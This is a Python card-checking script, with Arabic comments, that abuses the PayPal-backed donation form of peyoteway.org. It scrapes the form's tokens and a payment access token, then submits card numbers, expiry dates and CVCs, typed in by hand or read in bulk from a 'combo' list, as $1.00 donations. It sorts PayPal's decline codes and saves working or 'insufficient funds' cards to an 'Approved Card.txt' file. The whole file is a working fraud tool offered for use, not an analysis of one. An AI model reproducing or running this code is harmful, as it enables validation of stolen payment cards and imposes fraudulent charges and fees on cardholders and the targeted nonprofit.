import requests,base64
r=requests.Session()
import re
import time
from user_agent import *
user=generate_user_agent()
from requests_toolbelt.multipart.encoder import MultipartEncoder
# تعريف ألوان
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'  # لإعادة اللون للطبيعي
def pali(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]


	headers = {
	    'authority': 'peyoteway.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://peyoteway.org/sustainable-peyotism-donate/', cookies=r.cookies, headers=headers)
	id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
	id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
	nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
	
	
	enc = re.search(r'"data-client-token":"(.*?)"',response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
	
	
	headers = {
	    'authority': 'peyoteway.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://peyoteway.org',
	    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'give-honeypot': '',
	    'give-form-id-prefix': id_form1,
	    'give-form-id': id_form2,
	    'give-form-title': 'Donate Now to Support Sustainable Peyotism',
	    'give-current-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
	    'give-form-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
	    'give-form-minimum': '1.00',
	    'give-form-maximum': '999999.99',
	    'give-form-hash': nonec,
	    'give-price-id': 'custom',
	    'give-recurring-logged-in-only': '',
	    'give-logged-in-only': '1',
	    'give_recurring_donation_details': '{"is_recurring":false}',
	    'give-amount': '1.00',
	    'give-radio-donation-level': 'custom',
	    'payment-mode': 'paypal-commerce',
	    'give_first': 'Michel',
	    'give_last': 'lother',
	    'give_email': 'mahmodmustafa611@gmail.com',
	    'give_comment': '',
	    'card_name': 'Michel lother',
	    'card_exp_month': '',
	    'card_exp_year': '',
	    'give_action': 'purchase',
	    'give-gateway': 'paypal-commerce',
	    'action': 'give_process_donation',
	    'give_ajax': 'true',
	}
	
	response = r.post('https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	
	
	data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
	    'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
	    'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
	    'give-form-minimum': (None, '1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, 'custom'),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
	    'give-amount': (None, '1.00'),
	    'give-radio-donation-level': (None, 'custom'),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'Michel'),
	    'give_last': (None, 'lother'),
	    'give_email': (None, 'mahmodmustafa611@gmail.com'),
	    'give_comment': (None, ''),
	    'card_name': (None, 'Michel lother'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
	headers = {
	    'authority': 'peyoteway.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': data.content_type,
	    'origin': 'https://peyoteway.org',
	    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'action': 'give_paypal_commerce_create_order',
	}
	
	
	response = r.post(
	    'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	tok = (response.json()['data']['id'])
	
	
	
	
	
	headers = {
	    'authority': 'cors.api.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'paypal-client-metadata-id': 'a055254db747757ace15fc4c9a8cdbdf',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'payment_source': {
	        'card': {
	            'number': n,
	            'expiry': f'20{yy}-{mm}',
	            'security_code': cvc,
	            'attributes': {
	                'verification': {
	                    'method': 'SCA_WHEN_REQUIRED',
	                },
	            },
	        },
	    },
	    'application_context': {
	        'vault': False,
	    },
	}
	
	response = r.post(
	    f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
	    headers=headers,
	    json=json_data,
	)
	
	
	
	
	
	data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
	    'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
	    'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
	    'give-form-minimum': (None, '1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, 'custom'),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
	    'give-amount': (None, '1.00'),
	    'give-radio-donation-level': (None, 'custom'),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'Michel'),
	    'give_last': (None, 'lother'),
	    'give_email': (None, 'mahmodmustafa611@gmail.com'),
	    'give_comment': (None, ''),
	    'card_name': (None, 'Michel lother'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
	
	headers = {
	    'authority': 'peyoteway.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': data.content_type,
	    'origin': 'https://peyoteway.org',
	    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'action': 'give_paypal_commerce_approve_order',
	    'order': tok,
	}
	
	response = r.post(
	    'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)



	text = response.text
	if 'true' in text or 'sucsess' in text:    
		return 'CHARGE 1.00$'
	elif 'DO_NOT_HONOR' in text:
		return "DO_NOT_HONOR"
	elif 'ACCOUNT_CLOSED' in text:
		return "ACCOUNT_CLOSED"
	elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
		return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
	elif 'LOST_OR_STOLEN' in text:
		return "LOST_OR_STOLEN"
	elif 'CVV2_FAILURE' in text:
		return "CVV2_FAILURE"
	elif 'SUSPECTED_FRAUD' in text:
		return "SUSPECTED_FRAUD"
	elif 'INVALID_ACCOUNT' in text:
		return "INVALID_ACCOUNT"
	elif 'REATTEMPT_NOT_PERMITTED' in text:
		return "REATTEMPT_NOT_PERMITTED"
	elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
		return "ACCOUNT_BLOCKED_BY_ISSUER"
	elif 'ORDER_NOT_APPROVED' in text:
		return "ORDER_NOT_APPROVED"
	elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
		return "PICKUP_CARD_SPECIAL_CONDITIONS"
	elif 'PAYER_CANNOT_PAY' in text:
		return "PAYER_CANNOT_PAY"
	elif 'INSUFFICIENT_FUNDS' in text:
		return "INSUFFICIENT_FUNDS"
	elif 'GENERIC_DECLINE' in text:
		return "GENERIC_DECLINE"
	elif 'COMPLIANCE_VIOLATION' in text:
		return "COMPLIANCE_VIOLATION"
	elif 'TRANSACTION_NOT_PERMITTED' in text:
		return "TRANSACTION_NOT_PERMITTED"
	elif 'PAYMENT_DENIED' in text:
		return "PAYMENT_DENIED"
	elif 'INVALID_TRANSACTION' in text:
		return "INVALID_TRANSACTION"
	elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
		return "RESTRICTED_OR_INACTIVE_ACCOUNT"
	elif 'SECURITY_VIOLATION' in text:
		return "SECURITY_VIOLATION"
	elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
		return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
	elif 'INVALID_OR_RESTRICTED_CARD' in text:
		return "INVALID_OR_RESTRICTED_CARD"
	elif 'EXPIRED_CARD' in text:
		return "EXPIRED_CARD"
	elif 'CRYPTOGRAPHIC_FAILURE' in text:
		return "CRYPTOGRAPHIC_FAILURE"
	elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
		return "TRANSACTION_CANNOT_BE_COMPLETED"
	elif 'DECLINED_PLEASE_RETRY' in text:
		return "DECLINED_PLEASE_RETRY_LATER"
	elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
		return "TX_ATTEMPTS_EXCEED_LIMIT"
	else:
		try:
			result = response.json()['data']['error']
			return result
		except:
			return "UNKNOWN_ERROR"
            

	
if __name__ == '__main__':
	Getat = 'PayPal 𝕭𝖓𝖑𝖆𝖉𝖊𝖓 1.00$@iiz_w'
	print(f"                      {Colors.RED}Cheker {Getat}\n\n\n{Colors.RESET}")
	Br = input(f'{Colors.GREEN}Enter Numer (Manual : 1 - Combo : 2) : {Colors.RESET}')
	if Br == '1':
		try:
		    while True:
		        ar = input(f'Enter Card ( n | mm | yy | cvc ): {Colors.RESET}')
		        resulti = pali(ar)
		        if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
		            with open('Approved Card.txt', "a") as f:
		                f.write(ar +f': {resulti} > {Getat}\n')
		
		        print('Response: ' + resulti)
		        time.sleep(5)
		except Exception as e:
		    print('Error -', e)
	else:
		noy = 0
		cr = input(f'{Colors.YELLOW}Enter Name Combo:{Colors.RESET}')
		with open(cr, "r") as f:
			crads = f.read().splitlines()
			print(f'{Colors.BLUE}Wait Checking Your Card ...\n{Colors.RESET}')
			for P in crads:
				noy += 1
				try:
					resulti = pali(P)
				except Exception as e:
					resulti = f'Erorr {e}'
				if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
					with open('Approved Card.txt', "a") as f:
						f.write(P + f': {resulti} > {Getat}\n') 
				print(f'[{noy}] ' + P + '  >>  ' + resulti)
				time.sleep(10)